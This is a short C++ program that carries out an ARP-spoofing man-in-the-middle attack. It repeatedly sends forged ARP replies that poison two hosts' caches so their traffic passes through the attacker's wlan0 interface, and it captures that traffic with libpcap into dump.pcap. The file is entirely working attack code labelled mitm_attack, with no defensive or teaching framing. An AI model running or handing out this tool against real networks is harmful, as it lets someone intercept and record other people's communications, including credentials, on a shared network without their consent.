#include "pgen.h"
#include <stdio.h>
#include <pcap.h>
#include <thread>

const char* dev = "wlan0";
const char* dumpfile = "dump.pcap";

void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2);
void capture(const char* ip1, const char* ip2);



int main(int argc,char** argv){
	if(argc != 5){
		printf("args\n");
		return -1;
	}

	std::thread mitm(mitm_attack, argv[1], argv[2], argv[3], argv[4]);
	capture(argv[1], argv[3]);
}


void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	//pack_to_target1.ETH.src = pgen_getMAC(dev);
	pack_to_target1.ETH.src.setmacbydev(dev);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth.setmacbydev(dev);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.operation = PGEN_ARPOP_REPLY;

	pack_to_target2.ETH.src.setmacbydev(dev);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth.setmacbydev(dev);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.operation = PGEN_ARPOP_REPLY;

	for(int i=0; ; i++){
		printf("0x%04x: %s[%s] <MITM> %s[%s] \n", i, 
				pack_to_target1.ARP.dstIp.c_str(),
				pack_to_target1.ARP.dstEth.c_str(),
				pack_to_target2.ARP.dstIp.c_str(),
				pack_to_target2.ARP.dstEth.c_str() );

		pack_to_target1.SEND(dev);
		pack_to_target2.SEND(dev);
		sleep(1);
	}		
}


void capture(const char* ip1, const char* ip2){
	pcap_t* handle;
	pcap_dumper_t *pdump;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program bpfprog;
	char filtercmd[256];
	sprintf(filtercmd, "ip && ((net %s) || (net %s))", ip1, ip2);

	handle = pcap_open_live(dev, 66536, 1,10,errbuf);
	if(handle == NULL){
		fprintf(stderr, "%s\n", errbuf);
		return;
	}
	if(pcap_compile(handle, &bpfprog, filtercmd, 0, 0) < 0){
		fprintf(stderr, "compile: %s\n", pcap_geterr(handle));
		pcap_close(handle);
		return;
	}
	if(pcap_setfilter(handle, &bpfprog) < 0){
		fprintf(stderr, "setfilter: %s\n", pcap_geterr(handle));
		pcap_close(handle);
		return;
	}
	pdump = pcap_dump_open(handle, dumpfile);
	if(pdump == NULL){	
		fprintf(stderr, "%s\n", pcap_geterr(handle));
		pcap_close(handle);
		return;
	}
	if(pcap_loop(handle, 0, pcap_dump, (u_char*)pdump) < 0){
		fprintf(stderr, "%s\n", pcap_geterr(handle));
		pcap_dump_close(pdump);
		pcap_close(handle);
		return;
	}

	pcap_dump_close(pdump);
	pcap_close(handle);
	return;
}
